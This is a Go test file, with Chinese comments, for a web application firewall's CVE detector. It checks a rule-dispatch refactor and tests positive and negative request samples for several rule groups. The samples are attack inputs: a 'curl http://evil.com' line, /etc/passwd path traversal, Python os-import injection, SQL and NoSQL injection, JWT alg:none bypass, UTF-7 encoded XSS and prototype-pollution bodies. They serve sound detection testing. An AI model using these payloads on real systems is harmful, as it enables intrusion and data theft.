package cve

import (
	"testing"

	"My-OpenWaf/internal/ac"
)

var cveExtLegacyACCaseCVEs = []string{
	"CVE-2014-6271", "CVE-2025-24893", "CVE-2025-47812", "CVE-2025-4632",
	"CVE-2025-64446", "CVE-2025-10035", "CVE-2025-41243", "CVE-2025-47916",
	"CVE-2025-31161", "CVE-2025-32756", "CVE-2017-8046", "CVE-2021-21351",
	"CVE-2024-REMOTECALL", "CVE-2024-XXEUTF7", "CVE-2024-LDAPI", "CVE-2024-SENSFILE",
}

// cveExtLegacyCompoundCVEs 是重构前 switch 中复合 helper 的 11 条清单。
var cveExtLegacyCompoundCVEs = []string{
	"CVE-2023-GRAPHQL", "CVE-2025-30208", "CVE-2025-3248", "CVE-2025-53770",
	"CVE-2025-34028", "CVE-2023-1454", "CVE-2019-3929", "CVE-2024-JAVAINJ",
	"CVE-2024-DEEPPATH", "CVE-2024-NOSQLI", "CVE-2024-LOWCMD",
}

// legacyShouldScanRegisteredCVERuleAC 是重构前分发函数的忠实副本,
// 仅用于对拍,不参与生产路径。
func legacyShouldScanRegisteredCVERuleAC(rule *CVERule, combinedLower string, hit *ac.Mask) bool {
	switch rule.CVE {
	case "CVE-2023-GRAPHQL":
		return hasGraphQLIntrospectionSignalLower(combinedLower)
	case "CVE-2025-30208":
		return hasViteFSBypassSignalLower(combinedLower)
	case "CVE-2025-3248":
		return hasLangflowValidateCodeSignalLower(combinedLower)
	case "CVE-2025-53770":
		return hasSharePointToolShellSignalLower(combinedLower)
	case "CVE-2025-34028":
		return hasCommvaultDeploySignalLower(combinedLower)
	case "CVE-2023-1454":
		return hasJeecgSQLiSignalLower(combinedLower)
	case "CVE-2019-3929":
		return hasRouterCGIPathSignalLower(combinedLower)
	case "CVE-2024-JAVAINJ":
		return hasJavaCodeInjectSignalLower(combinedLower) || hasJavaOGNLSpELSignalLower(combinedLower)
	case "CVE-2024-DEEPPATH":
		return hasDeepPathTraversalSignalLower(combinedLower)
	case "CVE-2024-NOSQLI":
		return hasNoSQLInjectSignalLower(combinedLower)
	case "CVE-2024-LOWCMD":
		return registeredCVERuleContainsLowCmdSignal(combinedLower)
	case "CVE-2014-6271", "CVE-2025-24893", "CVE-2025-47812", "CVE-2025-4632",
		"CVE-2025-64446", "CVE-2025-10035", "CVE-2025-41243", "CVE-2025-47916",
		"CVE-2025-31161", "CVE-2025-32756", "CVE-2017-8046", "CVE-2021-21351",
		"CVE-2024-REMOTECALL", "CVE-2024-XXEUTF7", "CVE-2024-LDAPI", "CVE-2024-SENSFILE":
		return registryACGate(rule.CVE, hit)
	default:
		return true
	}
}

/**
 * TestRegistryGateRefactorEquivalenceLegacy 对拍重构前后的分发判定。
 *
 * 对 16 条 AC 规则:每个 needle 单独、needle 带前后缀封装、无关文本、空串
 * 四类样本,legacy(switch case 清单)与新(registryNeedleGroups 键集合)必须
 * 逐样本一致;对 11 条复合 helper:开门/关门样本一致;对未登记 CVE:
 * 两版都返回 true(default 语义)。
 */
func TestRegistryGateRefactorEquivalenceLegacy(t *testing.T) {
	rule := &CVERule{}

	check := func(cveID, sample string) {
		t.Helper()
		hit := registryACData.ac.MatchMask(sample)
		rule.CVE = cveID
		want := legacyShouldScanRegisteredCVERuleAC(rule, sample, &hit)
		got := shouldScanRegisteredCVERuleAC(rule, sample, &hit)
		if got != want {
			t.Fatalf("CVE=%s sample=%q 判定漂移: legacy=%v new=%v", cveID, sample, want, got)
		}
	}

	// 16 条 AC 规则:needle 命中/未命中样本逐一覆盖。
	for _, cveID := range cveExtLegacyACCaseCVEs {
		needles := registryNeedleGroups[cveID]
		for _, n := range needles {
			check(cveID, n)
			check(cveID, "prefix-"+n+"-suffix")
			check(cveID, "no-match-"+n[:len(n)/2]+"!") // needle 断裂形态
		}
		check(cveID, "completely unrelated benign text")
		check(cveID, "")
	}

	// 11 条复合 helper:每条至少一个开门样本与一个关门样本。
	compoundSamples := map[string][]string{
		"CVE-2023-GRAPHQL":  {"{\"query\":\"{__schema{types{name}}}\"}", "normal query without introspection"},
		"CVE-2025-30208":    {"/@fs/tmp/secret?import&raw??", "normal vite asset request"},
		"CVE-2025-3248":     {"/api/v1/validate/code\n__import__('os')", "plain langflow page"},
		"CVE-2025-53770":    {"toolpane.aspx?displaymode=edit\nsignout.aspx\nmsotlpn_dwp", "plain sharepoint page"},
		"CVE-2025-34028":    {"deploywebpackage.do\ncommcellname=x\nservicepack=y\nversion=1\n../", "normal backup page"},
		"CVE-2023-1454":     {"/sys/dict\nunion select 1", "normal jeecg page"},
		"CVE-2019-3929":     {"/cgi-bin/x\nls", "plain router config page"},
		"CVE-2024-JAVAINJ":  {"processbuilder exec\n", "plain text"},
		"CVE-2024-DEEPPATH": {"....//....//....//....//etc/passwd", "plain path"},
		"CVE-2024-NOSQLI":   {"{\"x\":{\"$ne\":1}}", "plain json"},
		"CVE-2024-LOWCMD":   {"curl http://evil.com", "ordinary words only"},
	}
	for _, cveID := range cveExtLegacyCompoundCVEs {
		samples := compoundSamples[cveID]
		if len(samples) != 2 {
			t.Fatalf("compound samples for %s missing", cveID)
		}
		for _, s := range samples {
			check(cveID, s)
		}
		check(cveID, "")
	}

	// 未登记 CVE:两版 default 语义都必须放行(return true)。
	rule.CVE = "CVE-2099-NOT-REGISTERED"
	if !legacyShouldScanRegisteredCVERuleAC(rule, "anything", &ac.Mask{}) {
		t.Fatal("legacy default 语义漂移:未登记规则被拦截")
	}
	hit := registryACData.ac.MatchMask("anything")
	if !shouldScanRegisteredCVERuleAC(rule, "anything", &hit) {
		t.Fatal("重构后 default 语义漂移:未登记规则被拦截")
	}

	// 结构性断言:16 条 AC 键与 registryNeedleGroups 键集合完全一致,
	// 复合 helper 不落入 map 首查路径。
	for _, cveID := range cveExtLegacyACCaseCVEs {
		if _, ok := registryNeedleGroups[cveID]; !ok {
			t.Fatalf("AC case %s 未登记进 registryNeedleGroups,map 路由会漏活", cveID)
		}
	}
	for _, cveID := range cveExtLegacyCompoundCVEs {
		if _, ok := registryNeedleGroups[cveID]; ok {
			t.Fatalf("复合 helper %s 不应出现在 registryNeedleGroups(会被 map 首查吞掉)", cveID)
		}
	}
}

// detectCVEs 是端到端探测快捷方式:构造 CVERequest 并返回命中的 CVEID 集合。
func detectCVEs(t *testing.T, path, query, body, contentType string, headers map[string]string) map[string]bool {
	t.Helper()
	req := BuildCVERequest(path, query, headers, []byte(body), contentType)
	d := NewCVEDetector()
	found := make(map[string]bool)
	for _, m := range d.Detect(req) {
		found[m.CVEID] = true
	}
	return found
}

/**
 * TestCVEExtendNewRuleGroups 覆盖 9 组接入的 5 个落项(组1/2/3/4/6)的正反例。
 */
func TestCVEExtendNewRuleGroups(t *testing.T) {
	t.Run("组1 NGINX rewrite 多捕获引用", func(t *testing.T) {
		positives := []struct {
			name, query string
		}{
			{"相邻捕获引用 $1$2", "id=$1$2"},
			{"$1$2$3 三捕获", "id=$1$2$3"},
			{"$1 与 $2 同视窗分离", "a=$1&b=$2"},
			{"$1 与 $2 相邻三连", "x=$2y$1"},
			{"URL 编码 %241%242 解码回 $1$2", "id=%241%242"},
		}
		for _, tt := range positives {
			t.Run(tt.name, func(t *testing.T) {
				if !detectCVEs(t, "/rewrite", tt.query, "", "", nil)["CVE-2026-42945"] {
					t.Errorf("expected CVE-2026-42945 for query=%q", tt.query)
				}
			})
		}
		negatives := []struct {
			name, query string
		}{
			// 单 $1 禁止单独做门(核心负例)。
			{"单 $1 捕获", "id=$1"},
			{"单 $2 捕获", "id=$2"},
			{"普通查询", "q=hello&page=2"},
			{"美元金额", "price=$10"},
			{"锚点样式", "a=$x&b=$y"},
		}
		for _, tt := range negatives {
			t.Run(tt.name, func(t *testing.T) {
				if detectCVEs(t, "/rewrite", tt.query, "", "", nil)["CVE-2026-42945"] {
					t.Errorf("unexpected CVE-2026-42945 for query=%q", tt.query)
				}
			})
		}
	})

	t.Run("组2 SharePoint metadata 认证绕过", func(t *testing.T) {
		const spPath = "/_layouts/15/metadata/json/1"
		positives := []struct {
			name, body string
		}{
			{"alg none 小写 + act", `{"alg":"none"} act:user`},
			{"alg NONE 大写 + act", `{"alg":"NONE"} act:user`},
			{"alg None 混合 + act", `{"alg":"None"} act:user`},
			{"alg noNe 混合 + actor", `{"alg":"noNe"} actor:user`},
		}
		for _, tt := range positives {
			t.Run(tt.name, func(t *testing.T) {
				if !detectCVEs(t, spPath, "", tt.body, "application/json", nil)["CVE-2026-55040"] {
					t.Errorf("expected CVE-2026-55040 for body=%q", tt.body)
				}
			})
		}
		// 单组件负例逐个:三组件缺一即不告警。
		negatives := []struct {
			name, body string
		}{
			{"仅路径无 JWT 无 act", ""},
			{"仅 alg:none 无 act", `{"alg":"none"}`},
			{"仅 act 无 alg", `{"alg":"RS256"} act:user`},
			{"alg 为正常算法 + act", `{"alg":"HS256"} act:user`},
			{"alg:none 但路径不对", `{"alg":"none"} act:user`}, // path 用普通页
			{"alg 前缀近似词 none 不完整", `{"alg":"no"} act:user`},
			{"alg genuine 内含 none 词", `{"alg":"genuine"} act:user`},
		}
		for _, tt := range negatives {
			t.Run(tt.name, func(t *testing.T) {
				path := spPath
				if tt.name == "alg:none 但路径不对" {
					path = "/_layouts/15/metadata/json/2"
				}
				if detectCVEs(t, path, "", tt.body, "application/json", nil)["CVE-2026-55040"] {
					t.Errorf("unexpected CVE-2026-55040 for body=%q", tt.body)
				}
			})
		}
	})

	t.Run("组3 PSEMHUB", func(t *testing.T) {
		positives := []struct {
			name, path, query string
		}{
			{"大写路径", "/PSEMHUB/api", ""},
			{"小写 query 字面", "/x", "a=psemhub"},
			{"混合大小写", "/x", "a=PsEmHuB"},
			{"%50 双解码回 p", "/x", "a=%50%73emhub"},
			{"body 字面", "/x", "b=psemhub"},
		}
		for _, tt := range positives {
			t.Run(tt.name, func(t *testing.T) {
				body := ""
				path, query := tt.path, tt.query
				if tt.name == "body 字面" {
					path, query, body = "/x", "", "b=psemhub"
				}
				if !detectCVEs(t, path, query, body, "", nil)["CVE-2026-35273"] {
					t.Errorf("expected CVE-2026-35273 for path=%q query=%q", path, query)
				}
			})
		}
		for _, tt := range []struct{ name, path, query string }{
			{"正常路径", "/people/api", ""},
			{"近似词 non-psemhub", "/x", "a=psemvu"},
			{"psem 前缀截断", "/x", "a=psem"},
		} {
			t.Run(tt.name, func(t *testing.T) {
				if detectCVEs(t, tt.path, tt.query, "", "", nil)["CVE-2026-35273"] {
					t.Errorf("unexpected CVE-2026-35273 for path=%q query=%q", tt.path, tt.query)
				}
			})
		}
	})

	t.Run("组4 UTF-7 扩充分支 matchAll 门", func(t *testing.T) {
		positives := []struct {
			name, ct, body string
		}{
			{
				"charset=utf-7 原形态",
				"multipart/form-data; boundary=abc",
				"--abc\r\nContent-Disposition: form-data; name=\"u\"\r\nContent-Type: text/plain; charset=utf-7\r\n\r\n+ADw-script+AD4-alert(1)\r\n--abc--\r\n",
			},
			{
				"+AD4- 扩展分支",
				"multipart/form-data; boundary=abc",
				"--abc\r\nContent-Disposition: form-data; name=\"u\"\r\nContent-Type: text/plain\r\n\r\n+AD4-+ADw-script+AD4-alert(1)\r\n--abc--\r\n",
			},
			{
				"+ADw-Img 扩展分支",
				"multipart/form-data; boundary=abc",
				"--abc\r\nContent-Disposition: form-data; name=\"u\"\r\nContent-Type: text/plain\r\n\r\n+ADw-Img src=x onerror=alert(1)\r\n--abc--\r\n",
			},
		}
		for _, tt := range positives {
			t.Run(tt.name, func(t *testing.T) {
				if !detectCVEs(t, "/upload", "", tt.body, tt.ct, nil)["CVE-2026-21876"] {
					t.Errorf("expected CVE-2026-21876 for ct=%q", tt.ct)
				}
			})
		}
		negatives := []struct {
			name, ct, body string
		}{
			// matchAll 门语义保留:multipart 必须出现,+AD4- 单独不足以开门。
			{"非 multipart url 编码 +AD4-", "application/x-www-form-urlencoded", "a=%2BAD4-x"},
			{"非 multipart 明文 +AD4-", "text/plain", "hello +AD4- world"},
			{"multipart 但无危险 charset", "multipart/form-data; boundary=abc", "--abc\r\nContent-Disposition: form-data; name=\"u\"\r\n\r\nplain text ok\r\n--abc--\r\n"},
		}
		for _, tt := range negatives {
			t.Run(tt.name, func(t *testing.T) {
				if detectCVEs(t, "/upload", "", tt.body, tt.ct, nil)["CVE-2026-21876"] {
					t.Errorf("unexpected CVE-2026-21876 for ct=%q", tt.ct)
				}
			})
		}
	})

	t.Run("组6 React2Shell 载体扩充", func(t *testing.T) {
		// 载体 needle 扩充的换处是 AC gate 放行范围:扩展 needle 命中时
		// gate 必须放行该 body 视图(白盒断言),但 CheckFunc 正则仍把关,
		// 无原型链的纯载体不告警。
		carrierReg := "react-server-dom-webpack"
		req := BuildCVERequest("/", "", nil, []byte("1:{\"chunk\":\""+carrierReg+"\"}\n"), "text/plain")
		hits := computeSubDetectorHits(req)
		kind := &globalSubDetectorAC.masks[subDetectorMaskKindIndex("body")]
		mask := kind.mask["CVE-2025-55182"]
		if mask == nil || !hits.body.Intersects(mask) {
			t.Fatalf("react-server-dom-webpack 载体未纳入 CVE-2025-55182 body AC gate")
		}
		// 无原型链:仅载体不告警。
		if detectCVEs(t, "/", "", "1:{\"chunk\":\""+carrierReg+"\"}\n", "text/plain", nil)["CVE-2025-55182"] {
			t.Error("unexpected CVE-2025-55182 for bare carrier without prototype chain")
		}
		// 载体 + Flight 引用 + 原型污染指示:命中(扩充后 gate 放行此形态)。
		bodyHits := "0:\"$1:A\"\n1:{\"chunk\":\"" + carrierReg + "\"}\n" +
			"2:{\"__proto__\":[\"constructor\"]}\n"
		if !detectCVEs(t, "/", "", bodyHits, "text/plain", nil)["CVE-2025-55182"] {
			t.Error("expected CVE-2025-55182 for carrier + prototype chain flight body")
		}
		// server actions 载体同理:gate 放行、纯载体不告警。
		req2 := BuildCVERequest("/", "", nil, []byte("server actions config"), "text/plain")
		hits2 := computeSubDetectorHits(req2)
		if mask == nil || !hits2.body.Intersects(mask) {
			t.Fatalf("server actions 载体未纳入 CVE-2025-55182 body AC gate")
		}
		if detectCVEs(t, "/", "", "server actions config", "text/plain", nil)["CVE-2025-55182"] {
			t.Error("unexpected CVE-2025-55182 for bare server actions text")
		}
	})
}
